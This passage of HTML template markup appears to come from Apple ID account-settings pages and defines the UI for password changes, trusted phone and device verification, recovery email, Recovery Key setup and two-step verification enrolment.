    <div class="form-group form-group-confirm clearfix">
        <div class="pop-wrapper field-pop-wrapper">
           <div class="field-wrapper field-confirm-password">
                <input aria-required="true" autocomplete="off" type="password" can-field="{confirmPassword}" class="field form-field form-control confirm-pw{{#if fieldErrors.confirmPassword.hasErrors}} error has-errors{{/if}}" id="confirmPassword" placeholder='confirm password'/>
           </div>
           {{#fieldErrors.confirmPassword.showErrors}}
                <div class="errorPop-body popover" role="tooltip">
                    <div id="arrow" class="errorPop-arrow arrow"></div>
                    <div class="errorPop-content popover-content">
                        {{fieldErrors.confirmPassword.main.message}}
                    </div>
                </div>
           {{/if}}
        </div>
    </div>
    {{#is account.type "hsa2"}}
    <div class="form-group clearfix">
        <div class="checkbox">
            <input type="checkbox" name="signoutAppleID" id="signoutAppleID" can-value="isSignoutRequired" />
            <label for="signoutAppleID" class="checkbox-label">
                Sign out devices and websites using my Apple ID.
            </label>
            <button id="signoutAbout" name="signoutAbout" class="btn btn-link btn-icon list-action signout-about">
                <i class="icon icon_help"></i><span class="sr-only">Learn more about this feature.</span>
            </button>
        </div>
    </div>
    {{/is}}
    {{#showStrength}}
        <div class="password-strength">
            <password-strength classes="rt-pwd-strength" show="{showStrength}" strength="{strength}" percentage="{percentage}" password="{currentPassword}" errors="{errors.password}" change-password-policy="{changePasswordPolicy}"></password-strength>
        </div>
    {{/if}}
    <div class="popover-footer flow-footer clearfix">
        <div class="btn-group flow-controls pull-right">
            <loading loading="{changingPassword}"></loading>
            <button class="btn btn-link first cancel">Cancel</button>
            <button class="btn btn-link last change"{{^changeEnabled}} disabled{{/if}}{{#fieldErrors.confirmPassword.hasErrors}} disabled{{/if}}{{#fieldErrors.currentPassword.hasErrors}} disabled{{/if}}{{#fieldErrors.password.hasErrors}} disabled{{/if}}>
                <span class="mobile-only">
                    Change
                </span>
                <span class="not-mobile">
                    Change Password...
                </span>
            </button>
        </div>
    </div>
</div>

</script>
<script type="text/stache" id="jstache_1758859539">


<div class="pop-wrapper pop-inline remove-trusted-wrapper">
    <button class="btn btn-link btn-icon btn-remove list-action remove-trusted">
        <i class="icon icon_remove"></i>
        <span class="sr-only">Remove</span>
    </button>
    {{#flow}}
        <div class="popover pop-flow pop-delete pop-deleteTrusted" role="group" tabindex="-1" style="display: none;">
            <div id="arrow" class="pop-arrow arrow"></div>
            <div class="mobile-only section-title">
                <h2 class="wrap-popover-title">
                    Deleted
                </h2>
            </div>
            <div class="pop-content popover-content">
                <div class="popover-body">
                    <div class="row">
                        <div class="col-sm-12">
                            <div class="details">
                                If you delete this phone number it can no longer be used to verify your identity.
                            </div>
                        </div>
                    </div>
                </div>
                <div class="popover-footer flow-footer clearfix">
                    <div class="btn-group flow-controls pull-right">
                        <loading loading="{loadingDelete}"></loading>
                        <button type="button" class="btn btn-link first cancel"> Cancel </button>
                        <button id="delete-phone" type="button" class="btn btn-link last delete-phone"> Delete </button>
                    </div>
                </div>
            </div>
        </div>
    {{/flow}}
</div>

</script>
<script type="text/stache" id="jstache_1347856758">


<div class="step step{{step}} trusted-phone-wrapper">
    <div class="popover-body">
        {{#is step "too-many-codes"}}
            <div class="details">
                {{errors.verify.main.message}}
            </div>
            <div class="aid-footer flow-footer clearfix">
                <div class="btn-group flow-controls pull-right">
                    <button type="button" class="btn btn-link last close-verify">
                        OK
                    </button>
                </div>
            </div>
        {{/is}}
            {{#is step "0"}}
              <div class="intro">
                  {{#is type 'device'}}
                  This device has not been verified.
                  {{else}}
                  This phone number has not been verified.
                  {{/}}
              </div>
              <div class="details">
                  {{#is type 'device'}}
                  All trusted devices must be verified before they can be used with your account.
                  {{else}}
                  All phone numbers must be verified before they can be used with your account.
                  {{/is}}
              </div>
              <div class="aid-footer flow-footer clearfix">
                  <div class="btn-group flow-controls pull-right{{#is loading 'verify'}} loading{{/is}}">
                      <loading loading="{verifyLoading}"></loading>
                      <button type="button" class="btn btn-link first cancel">
                          Cancel
                      </button>

                      <button type="button" class="btn btn-link last continueverify">
                          <span class="mobile-only">Next</span><span class="not-mobile">
                          Verify
                          </span>
                      </button>
                      {{#if errors.verify.hasErrors}}
                          <div class="errorPop-body popover" role="tooltip" style="margin-top: -36px;">
                              <div id="arrow" class="errorPop-arrow arrow"></div>
                              <div class="errorPop-content popover-content">
                                  {{errors.verify.main.message}}
                              </div>
                          </div>
                      {{/if}}
                  </div>
              </div>
            {{/is}}

            {{#is step "1"}}
                <div class="intro">
                    Enter a phone number that can receive text messages:
                </div>
                <div class="row">
                    <div class="col-sm-12">
                        <div class="pop-wrapper field-pop-wrapper">
                            <phone-input placeholder="phone number" errors="{errors.phone}" countries="{config.localizedResources.smsSupportedCountries}" value="{phone}" country-code="{countryDialCode}" field-name="trustedPhoneInput"></phone-input>
                            {{#if errors.phone.showErrors}}
                                <div class="errorPop-body popover" role="tooltip">
                                    <div id="arrow" class="errorPop-arrow arrow"></div>
                                    <div class="errorPop-content popover-content">
                                        {{errors.phone.main.message}}
                                    </div>
                                </div>
                            {{/if}}
                        </div>
                    </div>
                </div>
                {{#is account.type "hsa2"}}
                    <div class="details">
                        Verify this number with:
                    </div>

                    <div class="radio-choice">
                        <label class="radio-inline">
                            <input type="radio" name="codeMethod" can-value='{verifyWith}' value="sms" checked="checked">
                            Text Message
                        </label>
                        <label class="radio-inline">
                            <input type="radio" name="codeMethod" can-value='{verifyWith}' value="voice"/>
                            Phone Call
                        </label>
                    </div>
                {{/if}}
                <div class="aid-footer flow-footer clearfix">
                    <div class="btn-group flow-controls pull-right{{#state.loading}} loading{{/if}}">
                        <loading loading="{continueLoading}"></loading>
                        <button type="button" class="btn btn-link first cancel"> Cancel</button>
                        <button type="button" class="btn btn-link last continue"{{^continueEnabled}} disabled{{/if}}>
                        <span class="mobile-only">Next</span><span class="not-mobile">
                          Continue
                          </span>
                        </button>
                    </div>
                </div>
            {{/is}}
            {{#is step "2"}}
                <div class="intro security-code-alignment not-mobile">
                    A verification code has been sent to <span class="nowrap">{{name}}.</span>
                    Enter the code here:
                </div>

                <div class="intro security-code-alignment mobile-only">
                    A verification code has been sent to <span class="nowrap">{{name}}.</span><br>
                    Enter the code here:
                </div>

                <div class="details">
                    <div class="pop-wrapper field-pop-wrapper clearfix">
                            <div class="security-code-wrapper security-code-alignment">
                                <security-code use-popover="true" {(error-message)}="errors.code.main.message" length="{codeLength}" code="{code}" didReachMaxLength="{didReachMaxLength}" blur-on-complete="false" type="tel"></security-code>
                            </div>
                    </div>
                </div>

                <div class="aid-footer flow-footer clearfix resend-code-btn">
                    <div class="btn-group flow-controls pull-left{{#is loading 'resend'}} loading{{/is}}">
                        <button type="button" class="btn btn-link resend new-code">
                            {{^if resendLoading}}
                                <i class="icon icon_reload"></i> Send a new code
                            {{else}}
                                <loading loading="{resendLoading}"></loading> Sending Code
                            {{/resendLoading}}
                        </button>
                    </div>
                    <div class="btn-group flow-controls pull-right{{#is loading 'verify'}} loading{{/is}}">
                        <loading loading="{verifyLoading}"></loading>
                        <button type="button" class="btn btn-link first cancel">Cancel</button>
                        <button type="button" class="btn btn-link last verify"{{^didReachMaxLength}} disabled{{/if}}>Verify</button>
                    </div>
                </div>
            {{/is}}
    </div> <!--End popover-body-->
</div> <!--End trusted-phone-->

</script>
<script type="text/stache" id="jstache_228332763">


<div class="verify-phone-wrapper">
  <div class="pop-wrapper pop-inline">
    <button class="btn btn-link verify-phone"> Verify </button>
    {{#flow}}
        <div class="popover pop-flow pop-verifyPhone" role="group" tabindex="-1" style="display: none;">
            <div id="arrow" class="pop-arrow arrow"></div>
            <div class="mobile-only section-title">
                <h2 class="wrap-popover-title">
                    Verify Phone
                </h2>
            </div>
            <div class="pop-content popover-content">
                <trustedphoneflow trusted-phone="{trustedPhone}" account="{account}" config="{config}"
                                  flow="{flow}" step="0" device-list="{deviceList}" device-index="{{deviceIndex}}"></trustedphoneflow>
            </div>
        </div>
    {{/flow}}
  </div>
</div>

</script>
<script type="text/stache" id="jstache_891092728">


<div class="pop-wrapper pop-inline delete-device-wrapper">
    <button class="btn btn-link btn-icon btn-remove list-action remove-device">
        <i class="icon icon_remove"></i>
        <span class="sr-only">Remove</span>
    </button>
    {{#flow}}
        <div class="popover pop-flow pop-deleteDevice" role="group" tabindex="-1" style="display: none;">
            <div id="arrow" class="pop-arrow arrow"></div>
            <div class="section-title mobile-only">
                <h2 class="wrap-popover-title">
                    {{#is type "device"}}
                        Remove
                    {{else}}
                        Delete
                    {{/is}}
                </h2>
            </div>
            <div class="pop-content popover-content">
                <div class="popover-body">
                    <div class="intro">
                      {{#is type "device"}}
                          Remove device?
                      {{else}}
                          Remove phone number?
                      {{/is}}
                    </div>
                    <div class="details">
                        {{#is type "device"}}
                            Are you sure you want to remove <strong class="device-name">{{name}}</strong> from your trusted devices?
                        {{else}}
                            If you delete this phone number it can no longer be used to verify your identity.
                        {{/is}}
                    </div>

                <div class="aid-footer flow-footer clearfix">
                    <div class="btn-group flow-controls pull-right">
                        <loading loading="{loadingDelete}"></loading>
                        <button type="button" class="btn btn-link first cancel"> Cancel </button>
                        <button type="button" class="btn btn-link last delete" data-phoneId="{{ id }}">
                            Remove
                        </button>
                    </div>
                </div>
                </div>
            </div>
        </div>
    {{/flow}}
</div>

</script>
<script type="text/stache" id="jstache_2000048184">


<div class="verify-device-wrapper">
  <div class="pop-wrapper pop-inline">
    <button class="btn btn-link verify-device {{^canVerify}}disabled{{/canVerify}}" {{^canVerify}}disabled="disabled"{{/canVerify}}> Verify </button>
    {{#flow}}
        <div class="popover pop-flow pop-verifyDevice" role="group" tabindex="-1" style="display: none;">
            <div id="arrow" class="pop-arrow arrow"></div>
            <div class="mobile-only section-title">
                <h2 class="wrap-popover-title">
                    Verify Phone
                </h2>
            </div>
            <div class="pop-content popover-content">
                <trustedphoneflow account="{account}" trusted-phone="{trustedPhone}"
                                  verifynumber="{{verifynumber}}" config="{config}" flow="{flow}" step="0"
                                  type="{{type}}" livestatus="{{livestatus}}" vetted="{vetted}"
                                  device-list="{deviceList}" device-index="{{deviceIndex}}"></trustedphoneflow>
            </div>
        </div>
    {{/flow}}
  </div>
</div>

</script>
<script type="text/stache" id="jstache_732504312">


<span class="{{styleClass}} device-name force-ltr">{{name}}</span> 
{{#modelName}}<small class="device-class-name">({{modelName}})</small>{{/modelName}}
{{#isDeviceOffline}} <small class="device-status">(Offline)</small>{{/isDeviceOffline}}

</script>
<script type="text/stache" id="jstache_635620470">


<div class="step step{{step}} trusted-device-wrapper">
    <div class="popover-body">
        {{#is step "1"}}
        <div class="intro">
            Select a device to verify:
        </div>
        <div class="row">
            <div class="col-sm-12 device-container">
            <div class="pop-wrapper field-pop-wrapper clearfix">
                {{#filter deviceList filters.onlineUnvettedDevicesFilter}}
                {{#each .}}
                <label for="dev-{{id}}" class="device-item">
                    <input id="dev-{{id}}" name="verify-devices" type="radio" class="verify-device-option" value='{{id}}' />
                    <span class="device-name">{{name}}</span> {{#modelName}}<small class="device-class-name">({{modelName}})</small>{{/modelName}}
                </label>
                {{/each}}
                {{/filter}}
            </div>
            </div>
        </div>
        <div class="aid-footer flow-footer clearfix">
            <div class="btn-group flow-controls pull-right{{#state.loading}} loading{{/if}}">
                <loading loading="{continueLoading}"></loading>
                <button type="button" class="btn btn-link first cancel"> Cancel</button>
                <button type="button" class="btn btn-link last continue"{{^continueEnabled}} disabled{{/if}}>
                <span class="mobile-only">Next</span><span class="not-mobile">
                          Continue
                          </span>
                </button>
            </div>
        </div>
        {{/is}}
        {{#is step "2"}}
        <div class="intro">
            A verification code has been sent to <span class="nowrap">{{name}}.</span>
           <label class="multifield-label"> Enter the code here:</label>
        </div>


          <div class="details">
              <div class="pop-wrapper field-pop-wrapper clearfix">
                <div class="security-code-wrapper pull-left">
                  <security-code class="security-code" length="{codeLength}" code="{code}" didReachMaxLength="{didReachMaxLength}" type="tel" localisedigit="Digit"></security-code>
                  {{#if errors.code.hasErrors}}
                  <div class="errorPop-body popover" role="tooltip">
                      <div class="errorPop-arrow arrow"></div>
                      <div class="errorPop-content popover-content">
                          {{errors.code.main.message}}
                      </div>
                  </div>
                  </div>
                  {{/if}}
                </div>
          </div>

        <div class="aid-footer flow-footer clearfix">
            <div class="btn-group flow-controls pull-left{{#is loading 'resend'}} loading{{/is}}">
                <button type="button" class="btn btn-link resend new-code"{{#resendLoading}}
                disabled{{/if}}{{#resendDisabled}} disabled{{/if}}{{#verifyLoading}} disabled{{/if}}>
                    {{^if resendLoading}}
                    <i class="icon icon_reload"></i> Send a new code
                    {{else}}
                    <loading loading="{resendLoading}"></loading> Sending Code
                    {{/resendLoading}}
                </button>
            </div>

            <div class="btn-group flow-controls pull-right{{#is loading 'verify'}} loading{{/is}}">
                <loading loading="{verifyLoading}"></loading>
                <button type="button" class="btn btn-link first cancel">Cancel</button>
                <button type="button" class="btn btn-link last verify"{{^didReachMaxLength}} disabled{{/if}}>Verify</button>
            </div>
        </div>
        {{/is}}
    </div> <!--End popover-body-->
</div> <!--End trusted-phone-->
</script>
<script type="text/stache" id="jstache_317009021">


<div class="pop-wrapper pop-inline remove-recovery-wrapper">
    {{^if success}}
    <button class="btn btn-link btn-icon btn-remove list-action remove-recovery">
        <i class="icon icon_remove"></i>
        <span class="sr-only">Remove</span>
    </button>
    {{/if}}
    {{#flow}}
        <div class="popover pop-flow pop-delete pop-deleteRecovery" role="group" tabindex="-1" style="display: none;">
            <div id="arrow" class="pop-arrow arrow"></div>
            <div class="mobile-only section-title">
                <h2 class="wrap-popover-title">
                    Email
                </h2>
            </div>
            <div class="pop-content popover-content">
                <div class="popover-body">
                    <div class="row">
                        <div class="col-sm-12">
                            <div class="details">
                               {{#is account.type "sa"}}
                                    This address will no longer be used to reset your security questions if you forget them.
                                {{/is}}
                               {{#is account.type "hsa1"}}
                                    This address will no longer be used for account and security notifications from Apple.
                               {{/is}}
                               {{#is account.type "hsa2"}}
                                    This address will no longer be used for account and security notifications from Apple.
                               {{/is}}
                            </div>
                        </div>
                    </div>
                </div>
                <div class="popover-footer flow-footer clearfix">
                    <div class="btn-group flow-controls pull-right">
                        <loading loading="{loadingDelete}"></loading>
                        <button type="button" class="btn btn-link first cancel"> Cancel </button>
                        <button type="button" class="btn btn-link last delete" data-phoneId="{{ id }}"> Delete </button>
                    </div>
                </div>
            </div>
        </div>
    {{/flow}}
</div>

</script>
<script type="text/stache" id="jstache_1905398838">


<div class="step step{{step}} flow-changeRecovery">
    <div class="popover-body">
        {{#is step "1"}}
            <div class="details">
                <label class="flow-label" id="addRecoveryEmailTitle">
                    {{#if titleText}}
                        {{titleText}}
                    {{else}}
                        {{#is account.type "sa"}}
                            Enter a new rescue email address:
                        {{/is}}
                        {{#is account.type "hsa1"}}
                            Enter a new notification email address:
                        {{/is}}
                        {{#is account.type "hsa2"}}
                            Enter a new notification email address:
                        {{/is}}
                    {{/if}}
                </label>
            </div>
            <div class="row">
                <div class="col-sm-12">
                    <div class="pop-wrapper field-pop-wrapper">
                        <email-input errors="{errors.email}" value="{newEmail}" placeholder='name@example.com' classlist="form-control" inputid="recoveryEmail" no-validation="true"></email-input>
                        {{#showRecycledDomainWarning}}
                        <recycled-domain-warning></recycled-domain-warning>
                        {{/showRecycledDomainWarning}}
                        {{#if errors.email.showErrors}}
                            <div class="errorPop-body popover" role="tooltip">
                                <div class="errorPop-arrow arrow"></div>
                                <div class="errorPop-content popover-content">
                                    {{#errors.email.map.unchanged}}
                                        This email address is being used as an Apple ID.
                                    {{else}}
                                        {{errors.email.main.message}}
                                    {{/if}}
                                </div>
                            </div>
                        {{/if}}
                    </div>
                </div>
            </div>
            <div class="aid-footer flow-footer clearfix">
                <div class="btn-group flow-controls pull-right">
                    <loading loading="{continueLoading}"></loading>
                    <button type="button" class="btn btn-link first cancel" data-dismiss="popover"> Cancel</button>
                    <button type="button" class="btn btn-link last continue change-recovery"{{^continueEnabled}} disabled{{/if}}{{#errors.email.hasErrors}} disabled{{/if}}>
                        <span class="mobile-only">Next</span><span class="not-mobile">Continue</span>
                    </button>
                </div>
            </div>
        {{/is}}

        {{#is step "2"}}
            <div class="intro" id="verifyRecoveryEmailTitle">
                An email with a verification code has been sent to <span class="graceful-wrap">{{newEmail}}.</span> Enter the code here:
            </div>
            <div class="row">
                <div class="col-sm-12">
                    <div class="details">
                     <div class="pop-wrapper field-pop-wrapper clearfix">
                       <div class="security-code-wrapper pull-left">
                         <security-code length="{codeLength}" code="{code}" didReachMaxLength="{didReachMaxLength}" type="tel" localisedigit="Digit"></security-code>
                          {{#if errors.code.hasErrors}}
                           <div class="popover errorPop-body" role="tooltip">
                            <div class="errorPop-arrow arrow"></div>
                             <div class="errorPop-content popover-content">
                              {{{errors.code.main.message}}}
                              </div>
                             </div>
                          {{/if}}
                       </div>
                     </div>
                  </div>
                </div>

            </div>



            <div class="aid-footer flow-footer clearfix">
                <div class="btn-group flow-controls pull-left{{#is loading 'resend'}} loading{{/is}}">
                    <div class="pop-wrapper field-pop-wrapper resend-code-wrapper">
                        <button type="button" class="btn btn-link resend
                        new-code"{{#resendLoading}} disabled{{/if}}{{#resendDisabled}} disabled{{/if}}{{#verifyLoading}} disabled{{/if}}>
                            {{^if resendLoading}}
                                <i class="icon icon_reload"></i> Send a new code
                            {{else}}
                                <loading loading="{resendLoading}"></loading> Sending Code
                            {{/resendLoading}}
                        </button>
                       </div>
                </div>

                <div class="btn-group flow-controls pull-right{{#is loading 'verify'}} loading{{/is}}">
                    <loading loading="{verifyLoading}"></loading>
                    <button type="button" class="btn btn-link first cancel">Cancel</button>
                    <button type="button" class="btn btn-link last verify"{{^didReachMaxLength}} disabled{{/if}}{{#verifyLoading}} disabled{{/if}}>Verify</button>
                </div>
            </div>
        {{/is}}
    </div>
</div>

</script>
<script type="text/stache" id="jstache_996472509">


<div class="verify-email pull-right">
  <div class="pop-wrapper pop-inline">
    <button class="btn btn-link verify-recovery">Verify </button>
    {{#flow}}
        <div class="popover pop-flow pop-verifyEmail" role="group" tabindex="0" style="display: none;">
            <div class="pop-arrow arrow"></div>
            <div class="mobile-only section-title">
                <h2 class="wrap-popover-title">
                    Email
                </h2>
            </div>
            <div class="pop-content popover-content">
                <verifyrecoveryflow account={account} success="{success}"></verifyrecoveryflow>
            </div>
        </div>
    {{/flow}}
  </div>
</div>

</script>
<script type="text/stache" id="jstache_616070096">


<div class="verify-email">
    <div class="pop-wrapper pop-inline">
        <button class="btn btn-link verify-rescue">Verify Email Address... </button>
        {{#showVerifyRescueEmailPopover}}
        <div class="popover pop-flow pop-verifyEmail" role="group" tabindex="-1" aria-labelledby="verifyRecoveryEmailTitle" style="display: none;">
            <div class="pop-arrow arrow"></div>
            <div class="mobile-only section-title">
                <h2 class="wrap-popover-title">
                    Email
                </h2>
            </div>
            <div class="pop-content popover-content">
                <verifyrecoveryflow account="{account}" flow="{showVerifyRescueEmailPopover}" success="{success}"></verifyrecoveryflow>
            </div>
        </div>
        {{/showVerifyRescueEmailPopover}}
    </div>
</div>

</script>
<script type="text/stache" id="jstache_462018798">


<div class="flow-changeQuestions">

    <changequestionsaction account="{account}"
                           errors="{validationErrors}"
                           config="{config}"
                           user-set="{userSet}"
                           qa-model="{qaModel}"
                           complete="{questionsComplete}">

    </changequestionsaction>

    <div class="aid-footer popover-footer flow-footer clearfix">
        <div class="btn-group flow-controls pull-right">
            <loading loading="{questionsLoading}"></loading>
            <button type="button" class="btn btn-link first cancel" data-dismiss="popover">Cancel</button>
            <button type="button" class="btn btn-link last done questions-changed"{{^questionsComplete}} disabled{{/if}}>
                <span class="mobile-only">
                    Next
                </span>
                <span class="not-mobile">
                    Change Questions...
                </span>
            </button>
        </div>
    </div>
</div>
</script>
<script type="text/stache" id="jstache_1177595572">


<div class="step step{{step}} flow-createnewrk">
    <div class="popover-body">

        {{#is step 1}}
            <div class="details">
                <p>If you activate a new Recovery Key, the old one will be deactivated and can no longer be used to reset your password or access your account.</p>
            </div>
            <div class="aid-footer pop-flow idms-popover-modal-footer clearfix">
                <div class="btn-group flow-controls pull-right">
                    <loading loading="{generateLoading}"></loading>
                    <button type="button" class="btn btn-link first cancel" data-dismiss="popover">Cancel</button>
                    <button type="button" class="btn btn-link last continue start-rk-continue">
                    Continue
                    </button>
                </div>
            </div>
        {{/is}}

        {{#is step 2}}
            <div class="mobile-only">
            <idms-toolbar cancel-button-text='Cancel'
                                                                          action-button-text='Next'
                                                                          section-title='Security'
                                                                          (actionClicked)="generateRKContinue"
                                                                          (cancelClicked)="cancelFlow">
            </idms-toolbar>
            </div>


            <div class="idms-mobile-modal-full-page-body">

            <div class="mobile-only">
            <p class="section-subtitle rk-label">NEW RECOVERY KEY:</p>
            </div>
            <div class="intro rkintro-mobile-push-down">
                <span>Print or write down your Recovery Key. Keep at least one copy in a safe place. Do not save it on your computer.</span>
                <div class="mobile-only"><br></div>
                <span><a href="http://support.apple.com/kb/HT5570#store_recovery_key" target="_blank" title="Where should I keep my Recovery Key?">Where should I keep my Recovery Key?</a></span>
                
            </div>

            <div class="details rkkey-mobile-push-up">
                <div class="rk-wrapper noselect">
                    <img src="https://appleid.cdn-apple.com/static/bin/cb773547687/images/key.png" height="26" alt="Recovery Key Icon" width="26" />
                     {{userFriendlyKey}}
                </div>
            </div>

            <div class="mobile-only">
            <button type="button" class="btn btn-link print">Print Recovery Key</button>
            </div>
            </div>


            <div class="not-mobile aid-footer generate-rk-wrap idms-popover-modal-footer clearfix">
                <div class="btn-group flow-controls pull-left">
                    <button type="button" class="btn btn-link print printRk-not-mobile">Print Recovery Key</button>
                </div>
                <div class="btn-group flow-controls pull-right">
                    <button type="button" class="btn btn-link first cancel">Cancel</button>
                    <button type="button" class="btn btn-link last generate-rk-continue">Continue</button>
                </div>
            </div>
        {{/is}}

        {{#is step 3}}

            <div class="mobile-only">
            <idms-toolbar cancel-button-text='Cancel'
                                                                          action-button-text='Next'
                                                                          section-title='Security'
                                                                          (actionClicked)="activateRKContinue"
                                                                          (cancelClicked)="cancelFlow" {loading}="doneLoading">
            </idms-toolbar>
            </div>

            <div class="idms-mobile-modal-full-page-body">
            <div class="intro">
                <p>Enter your Recovery Key to confirm and activate it. Your old Recovery Key will be deactivated and can no longer be used to access your account.</p>
            </div>

            <div class="mobile-only">
                <p class="section-subtitle rk-label">RECOVERY KEY:</p>
            </div>

            <div class="rk-input-wrapper{{#if errors.rk.hasErrors}} errors{{/if}} clearfix">
                 <div class="rk-key-icon">
                     <img src="https://appleid.cdn-apple.com/static/bin/cb773547687/images/key.png" height="26" alt="" width="26" />
                 </div>
             <recovery-key recovery-key="{userRecoveryKey}" max-length="{{recoveryKeyInputLength}}" classes="{{#if errors.rk.showErrors}}has-errors{{/if}}"></recovery-key>
            </div>

            {{#if rkMatchSuccess}}
                    <i class="icon icon_green_check icon_check"></i>
                    <span class="sr-only">Success</span>
            {{/if}}

            <idms-popover anchor-element=".rk-input-wrapper" type="error" {(show)}="errors.rk.hasErrors">
                {{{errors.rk.main.message}}}
            </idms-popover>
            </div>
            <div class="not-mobile aid-footer pop-flow idms-popover-modal-footer clearfix">
                <div class="btn-group flow-controls pull-right">
                    <loading loading="{doneLoading}"></loading>
                    <button type="button" class="btn btn-link first cancel">Cancel</button>
                    <button type="button" class="btn btn-link last activate-rk-continue"{{^continueEnabled}} disabled{{/if}}>Activate</button>
                </div>
            </div>
        {{/is}}

        {{#is step 4}}

            <div class="mobile-only">
            <idms-toolbar section-title='Security'>
            </idms-toolbar>
            </div>

            <div class="idms-mobile-modal-full-page-body">
            <div class="intro">
                <p class="rk-done-title">Your new Recovery Key has been activated.</p>
            </div>
            <div class="details">
                <p>It will be used to access your account if you forget your password or do not have access to your trusted devices.</p>
            </div>

            <div class="not-mobile aid-footer idms-popover-modal-footer clearfix">
                <div class="btn-group flow-controls pull-right">
                    <button type="button" class="btn btn-link last done-rk">Done</button>
                </div>
            </div>

            <div class="mobile-only">
            <br><button type="button" class="btn btn-link cancel rk-go-back">Go Back to Security Settings</button>
            </div>
            </div>
        {{/is}}
    </div>
</div>

</script>
<script type="text/stache" id="jstache_1227443540">


<div class="modal two-step-enroll-modal" id="twoStepEnrollModal">
    <div class="modal-dialog">
        <div class="modal-content" tabindex="-1" role="dialog" aria-labelledby="twoStepEnrollLabel">
            <div class="step step{{step}} pop-flow flow-enroll no-outline" tabindex="-1">
                {{#is step "1"}}
                    <div class="modal-header">
                        <h2 class="modal-title" id="twoStepEnrollLabel">Getting Started with Two-Step Verification</h2>
                        <div class="mobile-only section-title">
                            <h2 class="wrap-popover-title">
                                Security
                            </h2>
                        </div>
                    </div>
                    <div class="modal-body">
                        <div class="intro-title mobile-only">Getting Started with Two-Step Verification</div>
                        <div class="intro">
                            With two-step verification, your identity will be verified using one of your devices before you can make changes to your account, sign in to iCloud or make iTunes or App Store purchases from a new device.
                        </div>
                        <div class="row img-row">
                            <div class="col-sm-4"><img src="https://appleid.cdn-apple.com/static/bin/cb3697547320/images/step-one.png" height="100%" alt="step 1" width="100%" />
                                <div class="instruction">You enter your Apple ID and password as usual.</div>
                            </div>
                            <div class="col-sm-4"><img src="https://appleid.cdn-apple.com/static/bin/cb3117771197/images/step-two.png" height="100%" alt="step 2" width="100%" />
                                <div class="instruction">We send a verification code to one of your devices.</div></div>
                            <div class="col-sm-4"><img src="https://appleid.cdn-apple.com/static/bin/cb611404232/images/step-three.png" height="100%" alt="step 3" width="100%" />
                                <div class="instruction">You enter the code to verify your identity and complete sign in.</div>
                            </div>
                        </div>
                        <div class="detail">
                            You will also get a Recovery Key for safekeeping which you can use to access your account if you ever forget your password or lose your device.
                        </div>
                    </div>
                    <div class="flow-footer modal-footer  clearfix">
                        <div class="btn-group flow-controls pull-left learn-more">
                            <a href="https://support.apple.com/HT204152" target="_blank" class="btn btn-link">Learn More <span class="sr-only">about two-step verification, opens in a new window</span></a>
                        </div>
                        <div class="btn-group flow-controls pull-right">
                            <loading loading="{continueLoading}"></loading>
                            <button type="button" class="btn btn-link first cancel">Cancel</button>
                            <button type="button" class="btn btn-link last continue {{#isPendingCC}}disabled{{/isPendingCC}}" {{#isPendingCC}}disabled="disabled"{{/isPendingCC}}><span class="mobile-only">Next</span><span class="not-mobile">Continue</span></button>
                        </div>
                    </div>
                {{/is}}
                {{#is step "cc"}}
                <div class="body-wrapper">
                    <div class="modal-header">
                        <h4 class="modal-title">Verify your identity.</h4>
                        <div class="mobile-only section-title">
                            <h2 class="wrap-popover-title">
                                Phone Number
                            </h2>
                        </div>
                    </div>
                    <div class="content-body">
                        <div class="intro">
                            Please enter the information of your payment method on file. This is only to help verify your identity; your card will not be charged.
                        </div>
                        <div class="payment-wrapper">
                            <div class="intro">
                                Enter your credit card ending in <b>{{account.creditCard.trailingDigits}}</b>:
                            </div>
                            <div class="row">
                                <div class="col-md-8">
                                    <div class="form-group">
                                        <label class="sr-only" for="number">Credit Card</label>
                                        <input class="form-control" type="text" id="number" name="number"
                                               placeholder='credit card number' can-value="{creditCard.number}"/>
                                    </div>
                                </div>
                                <div class="col-md-4">
                                    <div class="form-group">
                                        <label class="sr-only" for="cvv">CVV</label>
                                        <div class="pop-wrapper pop-inline question-mark-wrapper">
                                            {{#flow}}
                                            <div class="popover pop-flow pop-creditcards" role="tooltip" style="display: none;">
                                                <div class="pop-arrow arrow"></div>
                                                <div class="pop-content popover-content">
                                                    <div class="popover-body">
                                                        <div id="cvv_popover">
                                                            <div class="cvv-title">
                                                                Where to find your Security Code:
                                                            </div>
                                                            <div class="cvv-visa">
                                                                <div class="cvv-sub-title">Visa / Mastercard / Discover:</div>
                                                                <img src="https://appleid.cdn-apple.com/static/bin/cb557578914/dist/assets/images/cvv_visa_mc.png" class="credit-card" />
                                                            </div>
                                                            <div class="cvv-amex">
                                                                <div class="cvv-sub-title">American Express:</div>
                                                                <img src="https://appleid.cdn-apple.com/static/bin/cb2499579377/dist/assets/images/cvv_amex.png" class="credit-card" />
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            {{/flow}}
                                            <button id="cvv_about" class="btn btn-link btn-icon list-action cvv-about" tabindex="-1">
                                                <i class="icon icon_help"></i><span class="sr-only">More Info</span>
                                            </button>
                                        </div>
                                        <input class="form-control" type="text" id="cvv" name="cvv" placeholder='security code' can-value="{creditCard.cvv}" maxlength="4" />
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="flow-footer modal-footer clearfix">
                    <div class="btn-group flow-controls pull-right">
                        <loading loading="{ccVerifyLoading}"></loading>
                        <button type="button" class="btn btn-link first cancel">Cancel</button>
                        <button type="button" class="btn btn-link last verify-cc"><span class="mobile-only">Next</span><span class="not-mobile">Continue</span></button>
                    </div>
                </div>
                {{/is}}
                {{#is step "2"}}
                    <div class="modal-header">
                        <h4 class="modal-title">Add a trusted phone number</h4>
                        <div class="mobile-only section-title">
                            <h2 class="wrap-popover-title">
                                Security
                            </h2>
                        </div>
                    </div>
                    <div class="modal-body step2">
                        <div class="intro-title mobile-only">Set Up Your Trusted Devices</div>
                        <div class="intro">
                            Enter the phone number you want to use to receive verification codes when signing in. This phone number must be able to receive SMS text messages.
                        </div>
                        <div class="action-wrapper">
                            <label class="intro not-mobile">
                                Add phone number:
                            </label>

                            <div class="clearfix">
                                <div class="pop-wrapper field-pop-wrapper">
                                    <div class="phone-wrapper clearfix">
                                        <phone-input placeholder="phone number" errors="{errors.phone}" countries="{config.localizedResources.smsSupportedCountries}" value="{phone}" country-code="{countryDialCode}" field-name="phoneEnrollInput"></phone-input>
                                    </div>
                                    {{#if errors.phone.showErrors}}
                                        <div class="errorPop-body popover" role="tooltip">
                                            <div class="errorPop-arrow arrow"></div>
                                            <div class="errorPop-content popover-content">
                                                {{errors.phone.main.message}}
                                            </div>
                                        </div>
